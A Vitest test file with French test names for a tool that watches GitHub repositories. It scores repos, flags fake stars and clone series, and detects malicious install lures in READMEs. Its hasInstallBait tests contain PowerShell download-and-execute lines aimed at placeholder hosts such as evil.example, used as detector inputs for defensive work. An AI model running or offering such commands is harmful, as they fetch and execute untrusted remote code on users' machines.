import { describe, expect, it } from 'vitest';
import {
  EMPTY_STATE,
  RETURN_AFTER_DAYS,
  classifyDomain,
  cleanReadme,
  collapseSeries,
  collectRepos,
  findCloneSeries,
  hasInstallBait,
  isBaitSuspect,
  isFresh,
  isNewRelease,
  isSuspect,
  licenseKind,
  markSeen,
  parseTrending,
  pickCandidates,
  readmeSkeleton,
  textSimilarity,
  type GithubRepo,
  type GithubSource,
  type RepoCandidate,
  type VeilleState,
} from './collectRepos';
import { VEILLE_DOMAINS, WATCHED_REPOS } from './veilleSources';

const NOW = new Date('2026-11-06T05:00:00Z');

function repo(name: string, over: Partial<GithubRepo> = {}): GithubRepo {
  return {
    full_name: name,
    description: 'Un dépôt',
    language: 'TypeScript',
    topics: [],
    stargazers_count: 100,
    forks_count: 10,
    created_at: '2026-11-01T00:00:00Z',
    pushed_at: '2026-11-05T00:00:00Z',
    archived: false,
    fork: false,
    license: { spdx_id: 'MIT' },
    ...over,
  };
}

function candidate(over: Partial<RepoCandidate>): RepoCandidate {
  return {
    id: '',
    repo: 'a/b',
    domain: 'Moteur local',
    via: 'recherche',
    description: '',
    language: null,
    topics: [],
    stars: 100,
    forks: 10,
    createdAt: '2026-10-27T00:00:00Z',
    ageDays: 10,
    starsPerDay: 10,
    pushedAt: '2026-11-05T00:00:00Z',
    license: 'MIT',
    licenseKind: 'libre',
    suspect: false,
    clones: [],
    installBait: false,
    contributors: null,
    readmeFile: null,
    excerpt: '',
    ...over,
  };
}

function source(over: Partial<GithubSource> = {}): GithubSource {
  return {
    searchRepos: () => Promise.resolve([]),
    getRepo: () => Promise.resolve(null),
    latestRelease: () => Promise.resolve(null),
    readme: () => Promise.resolve(null),
    contributors: () => Promise.resolve(null),
    trendingHtml: () => Promise.resolve(''),
    ...over,
  };
}

const INPUT = { state: EMPTY_STATE, now: NOW, windowDays: 14, perDomain: 15, pauseMs: 0 };

describe('licenseKind', () => {
  it('sépare ce qu’on peut copier de ce dont on s’inspire', () => {
    expect(licenseKind('MIT')).toBe('libre');
    expect(licenseKind('Apache-2.0')).toBe('libre');
    expect(licenseKind('AGPL-3.0')).toBe('copyleft');
    expect(licenseKind('GPL-3.0')).toBe('copyleft');
    expect(licenseKind('LGPL-2.1')).toBe('copyleft');
    expect(licenseKind('MPL-2.0')).toBe('copyleft');
  });

  it('une licence absente ou maison reste inconnue', () => {
    expect(licenseKind(null)).toBe('inconnue');
    expect(licenseKind('LicenseRef-Proprietary')).toBe('inconnue');
  });
});

describe('isSuspect', () => {
  it('étoiles sans aucun fork : le profil des fausses étoiles', () => {
    expect(isSuspect({ stars: 33, forks: 0, ageDays: 6 })).toBe(true);
  });

  it('beaucoup d’étoiles et presque aucun fork', () => {
    expect(isSuspect({ stars: 2724, forks: 42, ageDays: 10 })).toBe(true);
  });

  it('plus d’un fork pour deux étoiles : un réseau de comptes', () => {
    expect(isSuspect({ stars: 427, forks: 260, ageDays: 1 })).toBe(true);
  });

  it('un jeune dépôt sain ou encore confidentiel passe', () => {
    expect(isSuspect({ stars: 838, forks: 60, ageDays: 10 })).toBe(false);
    expect(isSuspect({ stars: 18, forks: 0, ageDays: 1 })).toBe(false);
    expect(isSuspect({ stars: 20, forks: 15, ageDays: 3 })).toBe(false);
  });

  it('l’âge prouve l’usage : un vieux dépôt n’est jamais suspect', () => {
    expect(isSuspect({ stars: 5000, forks: 0, ageDays: 400 })).toBe(false);
  });
});

describe('classifyDomain', () => {
  it('reconnaît un domaine à ses mots', () => {
    expect(classifyDomain('A server for the Model Context Protocol')).toBe('Skills et MCP');
    expect(classifyDomain('run llama.cpp on Vulkan')).toBe('Moteur local');
    expect(classifyDomain('self-hosted RSS reader')).toBe('Presse et bourse');
  });

  it('mots entiers : `rag` ne prend pas storage, ni `tts` settings', () => {
    expect(classifyDomain('object storage with fragile settings')).toBeNull();
  });

  it('hors périmètre : null', () => {
    expect(classifyDomain('rails/rails Ruby on Rails web framework')).toBeNull();
  });
});

describe('parseTrending', () => {
  const article = (name: string) =>
    `<article class="Box-row"><h2 class="h3 lh-condensed">\n  <a href="/${name}" data-view-component="true" class="Link">x</a></h2></article>`;

  it('lit les dépôts sans doublon', () => {
    const html =
      article('zed-industries/zed') + article('google/skills') + article('google/skills');
    expect(parseTrending(html)).toEqual(['zed-industries/zed', 'google/skills']);
  });

  it('ignore les autres liens, et une page vide ne casse rien', () => {
    expect(parseTrending('<a href="/login">Sign in</a><h2>Trending</h2>')).toEqual([]);
    expect(parseTrending('')).toEqual([]);
  });
});

describe('isFresh', () => {
  // NOW = 2026-11-06 : vu pour la dernière fois le 2026-10-30, il y a 7 jours.
  const state: VeilleState = {
    repos: { 'a/b': { firstSeen: '2026-10-20', lastSeen: '2026-10-30', stars: 100 } },
    releases: {},
  };

  it('un dépôt jamais vu est à montrer', () => {
    expect(isFresh(state, 'c/d', 10, NOW)).toBe(true);
  });

  it('un dépôt vu ne revient que si ses étoiles ont doublé', () => {
    expect(isFresh(state, 'a/b', 199, NOW)).toBe(false);
    expect(isFresh(state, 'a/b', 200, NOW)).toBe(true);
  });

  it(`pas avant ${RETURN_AFTER_DAYS} jours : un jeune dépôt double ses étoiles en un jour`, () => {
    const yesterday: VeilleState = {
      repos: { 'a/b': { firstSeen: '2026-11-05', lastSeen: '2026-11-05', stars: 30 } },
      releases: {},
    };
    expect(isFresh(yesterday, 'a/b', 400, NOW)).toBe(false);
  });

  it('un vus.json d’avant le 2026-11-21, sans lastSeen, compte depuis firstSeen', () => {
    const legacy: VeilleState = {
      repos: {
        'old/one': { firstSeen: '2026-10-01', stars: 10 },
        'new/one': { firstSeen: '2026-11-04', stars: 10 },
      },
      releases: {},
    };
    expect(isFresh(legacy, 'old/one', 20, NOW)).toBe(true);
    expect(isFresh(legacy, 'new/one', 20, NOW)).toBe(false);
  });

  it('un écart définitif ne revient jamais, même à cent fois plus d’étoiles', () => {
    for (const cause of ['licence', 'suspect', 'hors_sujet', 'concurrent', 'deja_couvert']) {
      const rejected: VeilleState = {
        repos: {
          'a/b': { firstSeen: '2026-01-01', stars: 10, rejected: { cause, day: '2026-01-01' } },
        },
        releases: {},
      };
      expect(isFresh(rejected, 'a/b', 1000, NOW)).toBe(false);
    }
  });

  it('seul « trop jeune » laisse revenir un écarté, aux conditions d’un dépôt vu', () => {
    const young: VeilleState = {
      repos: {
        'a/b': {
          firstSeen: '2026-10-20',
          lastSeen: '2026-10-30',
          stars: 100,
          rejected: { cause: 'trop_jeune', day: '2026-10-30' },
        },
      },
      releases: {},
    };
    expect(isFresh(young, 'a/b', 150, NOW)).toBe(false);
    expect(isFresh(young, 'a/b', 200, NOW)).toBe(true);
  });
});

describe('isNewRelease', () => {
  const release = (tag: string, published: string | null) => ({
    tag_name: tag,
    published_at: published,
  });

  it('version connue : compare les tags', () => {
    expect(isNewRelease('v1', release('v2', '2026-01-01T00:00:00Z'), NOW)).toBe(true);
    expect(isNewRelease('v2', release('v2', '2026-11-06T00:00:00Z'), NOW)).toBe(false);
  });

  it('premier run : seule une sortie récente compte', () => {
    expect(isNewRelease(undefined, release('v1', '2026-11-04T00:00:00Z'), NOW)).toBe(true);
    expect(isNewRelease(undefined, release('v1', '2026-10-01T00:00:00Z'), NOW)).toBe(false);
    expect(isNewRelease(undefined, release('v1', null), NOW)).toBe(false);
  });
});

describe('cleanReadme', () => {
  it('retire images, badges, HTML et commentaires, garde le texte', () => {
    const md =
      '<!-- caché -->\n[![CI](https://x/b.svg)](https://x)\n![logo](l.png)\n<p align="center">Bonjour</p>\n\n\n\n[lien](https://y)';
    expect(cleanReadme(md)).toBe('Bonjour\n\n[lien](https://y)');
  });
});

describe('pickCandidates', () => {
  it('quota par domaine : un domaine bruyant n’écrase pas les autres', () => {
    const noisy = Array.from({ length: 5 }, (_, i) =>
      candidate({ repo: `n/${i}`, domain: 'Skills et MCP', starsPerDay: 1000 }),
    );
    const quiet = candidate({ repo: 'q/1', domain: 'Presse et bourse', starsPerDay: 1 });
    const picked = pickCandidates([...noisy, quiet], 2);
    expect(picked.map(c => c.domain)).toEqual([
      'Skills et MCP',
      'Skills et MCP',
      'Presse et bourse',
    ]);
  });

  it('classe à l’élan, pas à la taille', () => {
    const old = candidate({ repo: 'old/big', stars: 100_000, starsPerDay: 5 });
    const rising = candidate({ repo: 'new/hot', stars: 500, starsPerDay: 100 });
    expect(pickCandidates([old, rising], 1)[0]?.repo).toBe('new/hot');
  });

  it('un suspect passe derrière un dépôt sain de même élan', () => {
    const fake = candidate({ repo: 'f/ake', starsPerDay: 100, suspect: true });
    const real = candidate({ repo: 'r/eal', starsPerDay: 50 });
    expect(pickCandidates([fake, real], 1)[0]?.repo).toBe('r/eal');
  });

  it('numérote r1, r2… dans l’ordre', () => {
    const picked = pickCandidates(
      [candidate({ repo: 'a/1' }), candidate({ repo: 'a/2', domain: 'Skills et MCP' })],
      5,
    );
    expect(picked.map(c => c.id)).toEqual(['r1', 'r2']);
  });
});

describe('markSeen', () => {
  const shown = (repo: string, stars: number, clones: RepoCandidate['clones'] = []) => ({
    repo,
    stars,
    clones,
  });
  const only = (candidates: ReturnType<typeof shown>[]) => ({
    candidates,
    releases: [],
    rejected: [],
  });

  it('garde la première date, note le dernier passage, met à jour étoiles et versions', () => {
    const before = { repos: { 'a/b': { firstSeen: '2026-11-01', stars: 10 } }, releases: {} };
    const after = markSeen(
      before,
      {
        candidates: [shown('a/b', 40), shown('c/d', 5)],
        releases: [{ repo: 'ollama/ollama', version: 'v1' }],
        rejected: [],
      },
      '2026-11-06',
    );
    expect(after.repos['a/b']).toEqual({
      firstSeen: '2026-11-01',
      lastSeen: '2026-11-06',
      stars: 40,
    });
    expect(after.repos['c/d']).toEqual({
      firstSeen: '2026-11-06',
      lastSeen: '2026-11-06',
      stars: 5,
    });
    expect(after.releases['ollama/ollama']).toBe('v1');
  });

  it('retient la cause de chaque écarté et le jour ; un définitif ne revient plus', () => {
    const after = markSeen(
      EMPTY_STATE,
      {
        candidates: [shown('CapriChooms/CapriCore', 40), shown('c/d', 5)],
        releases: [],
        rejected: [{ repo: 'CapriChooms/CapriCore', cause: 'concurrent' }],
      },
      '2026-11-11',
    );
    expect(after.repos['CapriChooms/CapriCore']?.rejected).toEqual({
      cause: 'concurrent',
      day: '2026-11-11',
    });
    expect(after.repos['c/d']?.rejected).toBeUndefined();
    const later = new Date('2027-06-01T05:00:00Z');
    expect(isFresh(after, 'CapriChooms/CapriCore', 4000, later)).toBe(false);
    expect(isFresh(after, 'c/d', 4000, later)).toBe(true);
  });

  it('les clones d’une série suivent leur représentant, avec leurs propres étoiles', () => {
    const after = markSeen(
      EMPTY_STATE,
      {
        candidates: [shown('spam/1', 500, [{ repo: 'spam/2', stars: 510 }])],
        releases: [],
        rejected: [{ repo: 'spam/1', cause: 'suspect' }],
      },
      '2026-11-13',
    );
    expect(after.repos['spam/2']).toEqual({
      firstSeen: '2026-11-13',
      lastSeen: '2026-11-13',
      stars: 510,
      rejected: { cause: 'suspect', day: '2026-11-13' },
    });
  });

  it('un « trop jeune » revenu et retenu perd son ancien écart', () => {
    const before: VeilleState = {
      repos: {
        'a/b': {
          firstSeen: '2026-11-01',
          stars: 10,
          rejected: { cause: 'trop_jeune', day: '2026-11-01' },
        },
      },
      releases: {},
    };
    const after = markSeen(before, only([shown('a/b', 40)]), '2026-11-09');
    expect(after.repos['a/b']).toEqual({
      firstSeen: '2026-11-01',
      lastSeen: '2026-11-09',
      stars: 40,
    });
  });

  it('garde les écartés que ce rapport n’a pas montrés', () => {
    const before: VeilleState = {
      repos: {
        'x/y': {
          firstSeen: '2026-11-01',
          stars: 9,
          rejected: { cause: 'licence', day: '2026-11-01' },
        },
      },
      releases: {},
    };
    const after = markSeen(before, only([shown('a/b', 1)]), '2026-11-06');
    expect(after.repos['x/y']).toEqual(before.repos['x/y']);
  });

  it('ne touche pas à l’état reçu', () => {
    const before = { repos: {}, releases: {} };
    markSeen(before, only([shown('a/b', 1)]), '2026-11-06');
    expect(before.repos).toEqual({});
  });
});

// Série modelée sur celle du 12/11/2026 : mêmes intertitres, textes réécrits.
const SKELETON = [
  'Why',
  'Without / With',
  'Quick Start',
  'Features',
  'How it works',
  'Usage',
  'Configuration',
  'Troubleshooting / FAQ',
  'Contributing',
  'Keywords',
  'License',
];

function templatedReadme(name: string, flavor: string): string {
  return [
    `# ${name}`,
    '',
    ...SKELETON.flatMap(h => [`## ${h}`, '', `${flavor} ${h.toLowerCase()} for ${name}.`, '']),
  ].join('\n');
}

function longText(seed: string, n = 60): string {
  return Array.from({ length: n }, (_, i) => `${seed}${i}`).join(' ');
}

describe('textSimilarity', () => {
  it('le même texte, nom changé, se reconnaît', () => {
    const a = `${longText('mot')} copilot-lab`;
    const b = `${longText('mot')} copilot-forge`;
    expect(textSimilarity(a, b)).toBeGreaterThan(0.9);
  });

  it('ignore casse et accents ; deux textes sans rapport sont à 0', () => {
    expect(textSimilarity('Réunion locale ÉCRITE', 'reunion locale ecrite')).toBe(1);
    expect(textSimilarity('voix française locale', 'tableau boursier')).toBe(0);
    expect(textSimilarity('', 'quelque chose')).toBe(0);
  });
});

describe('readmeSkeleton', () => {
  it('le plan sans le titre, normalisé : deux gabarits remplis différemment se rejoignent', () => {
    const a = readmeSkeleton(templatedReadme('blender-ai-copilot-lab', 'An AI lab'));
    const b = readmeSkeleton(templatedReadme('blender-ai-copilot-forge', 'A forge'));
    expect(a).not.toBe('');
    expect(a).toBe(b);
    expect(a).not.toContain('blender');
  });

  it('trop peu d’intertitres : pas de plan (Installation, Usage, License se croisent par hasard)', () => {
    expect(readmeSkeleton('# x\n## Installation\n## Usage\n## License\n')).toBe('');
  });
});

describe('findCloneSeries', () => {
  const member = (repo: string, over: Partial<Parameters<typeof findCloneSeries>[0][0]> = {}) => ({
    repo,
    createdAt: '2026-11-12T19:30:00Z',
    description: 'Un dépôt quelconque',
    readme: null,
    ...over,
  });
  const desc = longText('blender', 12);

  it('trois dépôts nés le même jour avec la même description forment une série', () => {
    const series = findCloneSeries([
      member('a1/blender-copilot-lab', { description: desc }),
      member('a2/blender-copilot-forge', { description: desc }),
      member('a3/blender-copilot-hub', { description: desc }),
      member('honnete/outil'),
    ]);
    expect(series).toEqual([
      ['a1/blender-copilot-lab', 'a2/blender-copilot-forge', 'a3/blender-copilot-hub'],
    ]);
  });

  it('même plan de README, textes différents : la série Blender', () => {
    const names = ['lab', 'forge', 'studio', 'hub'].map(n => `c${n}/blender-ai-copilot-${n}`);
    const series = findCloneSeries(
      names.map((n, i) =>
        member(n, { description: `Texte ${i}`, readme: templatedReadme(n, `Flavor${i}`) }),
      ),
    );
    expect(series).toEqual([names]);
  });

  it('une paire ne suffit pas, ni le même texte à des jours différents', () => {
    expect(
      findCloneSeries([member('a/1', { description: desc }), member('a/2', { description: desc })]),
    ).toEqual([]);
    expect(
      findCloneSeries([
        member('a/1', { description: desc, createdAt: '2026-11-10T00:00:00Z' }),
        member('a/2', { description: desc, createdAt: '2026-11-11T00:00:00Z' }),
        member('a/3', { description: desc, createdAt: '2026-11-12T00:00:00Z' }),
      ]),
    ).toEqual([]);
  });

  it('des descriptions courtes et voisines ne font pas une série (« An MCP server for… »)', () => {
    expect(
      findCloneSeries([
        member('a/notion', { description: 'An MCP server for Notion' }),
        member('b/slack', { description: 'An MCP server for Slack' }),
        member('c/linear', { description: 'An MCP server for Linear' }),
      ]),
    ).toEqual([]);
  });
});

describe('collapseSeries', () => {
  it('garde le meilleur rang, qui porte les clones et le signal suspect', () => {
    const series = [['s/1', 's/2', 's/3']];
    const out = collapseSeries(
      [
        candidate({ repo: 'ok/1' }),
        candidate({ repo: 's/1', stars: 500, starsPerDay: 10 }),
        candidate({ repo: 's/2', stars: 510, starsPerDay: 50 }),
        candidate({ repo: 's/3', stars: 490, starsPerDay: 5 }),
      ],
      series,
    );
    expect(out.map(c => c.repo)).toEqual(['ok/1', 's/2']);
    expect(out[1]?.suspect).toBe(true);
    expect(out[1]?.clones).toEqual([
      { repo: 's/1', stars: 500 },
      { repo: 's/3', stars: 490 },
    ]);
    expect(out[0]?.suspect).toBe(false);
  });

  it('reprend les clones déjà trouvés à l’étape précédente', () => {
    const out = collapseSeries(
      [
        candidate({ repo: 's/1', starsPerDay: 50, clones: [{ repo: 's/0', stars: 1 }] }),
        candidate({ repo: 's/2' }),
        candidate({ repo: 's/3' }),
      ],
      [['s/1', 's/2', 's/3']],
    );
    expect(out[0]?.clones.map(c => c.repo)).toEqual(['s/0', 's/2', 's/3']);
  });
});

describe('hasInstallBait', () => {
  it('une commande PowerShell qui télécharge puis exécute', () => {
    expect(hasInstallBait('```powershell\nirm https://evil.example/i.ps1 | iex\n```')).toBe(true);
    expect(hasInstallBait('powershell -c "iex (iwr https://x.example/a.ps1)"')).toBe(true);
    expect(
      hasInstallBait('(New-Object Net.WebClient).DownloadFile($u, "a.exe"); Start-Process a.exe'),
    ).toBe(true);
  });

  it('un lien vers un exécutable', () => {
    expect(hasInstallBait('[Télécharger](https://x.example/Setup.exe)')).toBe(true);
    expect(hasInstallBait('[setup]: https://x.example/app.msi')).toBe(true);
    expect(hasInstallBait('<a href="https://x.example/run.bat">Lancer</a>')).toBe(true);
  });

  it('un bouton : image cliquable « Download » ou « PowerShell setup »', () => {
    expect(hasInstallBait('[![Download](docs/download-button.svg)][download-url]')).toBe(true);
    expect(
      hasInstallBait(
        '<a href="https://x.github.io/y/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>',
      ),
    ).toBe(true);
  });

  it('pas sur un README ordinaire, ni sur le badge « Install in VS Code » d’un serveur MCP', () => {
    expect(hasInstallBait('## Install\n\n```\nnpm install foo\n```')).toBe(false);
    expect(
      hasInstallBait(
        '[![Install in VS Code](https://img.shields.io/badge/VS_Code-Install-0098FF)](https://insiders.vscode.dev/redirect/mcp/install?name=x)',
      ),
    ).toBe(false);
    expect(
      hasInstallBait(
        '[![Downloads](https://img.shields.io/github/downloads/a/b/total)](https://github.com/a/b/releases)',
      ),
    ).toBe(false);
    expect(hasInstallBait('curl -fsSL https://ollama.com/install.sh | sh')).toBe(false);
  });
});

describe('isBaitSuspect', () => {
  const bait = { installBait: true, ageDays: 4, contributors: 1 };

  it('un appât sur un dépôt jeune à un ou deux comptes', () => {
    expect(isBaitSuspect(bait)).toBe(true);
    expect(isBaitSuspect({ ...bait, contributors: null })).toBe(true);
  });

  it('chez un projet établi ou collectif, une installation ordinaire', () => {
    expect(isBaitSuspect({ ...bait, contributors: 40 })).toBe(false);
    expect(isBaitSuspect({ ...bait, ageDays: 900 })).toBe(false);
    expect(isBaitSuspect({ ...bait, installBait: false })).toBe(false);
  });
});

describe('collectRepos', () => {
  it('écarte forks, archivés et déjà vus', async () => {
    const result = await collectRepos(
      source({
        searchRepos: () =>
          Promise.resolve([
            repo('ok/new'),
            repo('x/fork', { fork: true }),
            repo('x/archived', { archived: true }),
            repo('x/seen'),
          ]),
      }),
      { ...INPUT, state: { repos: { 'x/seen': { firstSeen: 'x', stars: 100 } }, releases: {} } },
    );
    expect(result.candidates.map(c => c.repo)).toEqual(['ok/new']);
  });

  it('Trending : garde ce qui entre dans un domaine, écarte le reste', async () => {
    const html = (name: string) => `<h2 class="h3"><a href="/${name}">x</a></h2>`;
    const result = await collectRepos(
      source({
        trendingHtml: () => Promise.resolve(html('rails/rails') + html('foo/agent-tool')),
        getRepo: name =>
          Promise.resolve(
            name === 'rails/rails'
              ? repo(name, { description: 'Ruby web framework' })
              : repo(name, { description: 'An MCP server' }),
          ),
      }),
      INPUT,
    );
    expect(result.candidates.map(c => c.repo)).toEqual(['foo/agent-tool']);
    expect(result.candidates[0]?.via).toBe('trending');
    expect(result.candidates[0]?.domain).toBe('Skills et MCP');
  });

  it('une source en échec n’arrête pas les autres, et se compte', async () => {
    let calls = 0;
    const result = await collectRepos(
      source({
        searchRepos: () => {
          calls += 1;
          return calls === 1 ? Promise.reject(new Error('403')) : Promise.resolve([repo('ok/new')]);
        },
      }),
      INPUT,
    );
    expect(result.failed).toHaveLength(1);
    expect(result.candidates.map(c => c.repo)).toEqual(['ok/new']);
    expect(result.queried).toBeGreaterThan(VEILLE_DOMAINS.length);
  });

  it('prépare le dossier : README nettoyé, extrait, contributeurs', async () => {
    const result = await collectRepos(
      source({
        searchRepos: () => Promise.resolve([repo('ok/new')]),
        readme: () => Promise.resolve('![l](l.png)\nUn outil utile.'),
        contributors: () => Promise.resolve(3),
      }),
      INPUT,
    );
    const c = result.candidates[0];
    expect(c?.readmeFile).toBe('readmes/ok__new.md');
    expect(c?.excerpt).toBe('Un outil utile.');
    expect(c?.contributors).toBe(3);
    expect(result.readmes.get('readmes/ok__new.md')).toBe('Un outil utile.');
  });

  it('calcule l’âge, l’élan et la licence ; NOASSERTION reste inconnue', async () => {
    const result = await collectRepos(
      source({
        searchRepos: () =>
          Promise.resolve([
            repo('ok/new', {
              stargazers_count: 50,
              created_at: '2026-11-01T05:00:00Z',
              license: { spdx_id: 'NOASSERTION' },
            }),
          ]),
      }),
      INPUT,
    );
    const c = result.candidates[0];
    expect(c?.ageDays).toBe(5);
    expect(c?.starsPerDay).toBe(10);
    expect(c?.license).toBeNull();
    expect(c?.licenseKind).toBe('inconnue');
  });

  it('signale une nouvelle version d’une brique suivie, pas une déjà connue', async () => {
    const [first, second] = WATCHED_REPOS;
    const result = await collectRepos(
      source({
        latestRelease: name =>
          Promise.resolve(
            name === first || name === second
              ? {
                  tag_name: 'v2',
                  html_url: `https://github.com/${name}/releases/tag/v2`,
                  published_at: '2026-01-01T00:00:00Z',
                  body: 'Notes',
                }
              : null,
          ),
      }),
      { ...INPUT, state: { repos: {}, releases: { [first ?? '']: 'v1', [second ?? '']: 'v2' } } },
    );
    expect(result.releases.map(r => r.repo)).toEqual([first]);
    expect(result.releases[0]?.notes).toBe('Notes');
  });

  it('un écarté pour de bon ne revient ni par la recherche ni par Trending', async () => {
    const state: VeilleState = {
      repos: {
        'x/gpl': {
          firstSeen: '2026-10-01',
          stars: 10,
          rejected: { cause: 'licence', day: '2026-10-01' },
        },
        'x/young': {
          firstSeen: '2026-10-01',
          stars: 10,
          rejected: { cause: 'trop_jeune', day: '2026-10-01' },
        },
      },
      releases: {},
    };
    const big = { stargazers_count: 5000 };
    const result = await collectRepos(
      source({
        searchRepos: () => Promise.resolve([repo('x/gpl', big), repo('x/young', big)]),
        trendingHtml: () => Promise.resolve('<h2 class="h3"><a href="/x/gpl">x</a></h2>'),
        getRepo: name => Promise.resolve(repo(name, { ...big, description: 'An MCP server' })),
      }),
      { ...INPUT, state },
    );
    expect(result.candidates.map(c => c.repo)).toEqual(['x/young']);
  });

  it('une série de clones par la description ne prend qu’un dossier', async () => {
    const desc = longText('copilot', 12);
    const clone = (name: string, stars: number) =>
      repo(name, {
        description: desc,
        stargazers_count: stars,
        forks_count: 100,
        created_at: '2026-11-02T19:30:00Z',
      });
    const result = await collectRepos(
      source({
        searchRepos: () =>
          Promise.resolve([
            clone('a/lab', 500),
            clone('b/forge', 520),
            clone('c/hub', 480),
            repo('ok/new'),
          ]),
      }),
      INPUT,
    );
    expect(result.candidates.map(c => c.repo).sort()).toEqual(['b/forge', 'ok/new']);
    const rep = result.candidates.find(c => c.repo === 'b/forge');
    expect(rep?.suspect).toBe(true);
    expect(rep?.clones.map(c => c.repo).sort()).toEqual(['a/lab', 'c/hub']);
  });

  it('une série révélée par le README : un seul dossier, les README des clones ne sont pas écrits', async () => {
    const names = ['lab', 'forge', 'studio'].map(n => `c${n}/blender-ai-copilot-${n}`);
    const result = await collectRepos(
      source({
        searchRepos: () =>
          Promise.resolve(
            names.map((n, i) =>
              repo(n, { description: `Texte ${i}`, created_at: '2026-11-02T19:3' + i + ':00Z' }),
            ),
          ),
        readme: name => Promise.resolve(templatedReadme(name, `Flavor ${name.length}`)),
      }),
      INPUT,
    );
    expect(result.candidates).toHaveLength(1);
    expect(result.candidates[0]?.id).toBe('r1');
    expect(result.candidates[0]?.clones).toHaveLength(2);
    expect(result.readmes.size).toBe(1);
  });

  it('un appât d’installation sur un dépôt jeune et solitaire lève suspect', async () => {
    const result = await collectRepos(
      source({
        searchRepos: () => Promise.resolve([repo('bait/ollama-offline'), repo('ok/new')]),
        readme: name =>
          Promise.resolve(
            name === 'bait/ollama-offline'
              ? '### PowerShell Install Button\n<a href="https://bait.github.io/x/"><img src="b.png" alt="PowerShell setup"></a>'
              : 'Un outil utile.',
          ),
        contributors: () => Promise.resolve(1),
      }),
      INPUT,
    );
    const bait = result.candidates.find(c => c.repo === 'bait/ollama-offline');
    expect(bait).toMatchObject({ installBait: true, suspect: true });
    expect(result.candidates.find(c => c.repo === 'ok/new')).toMatchObject({
      installBait: false,
      suspect: false,
    });
  });
});
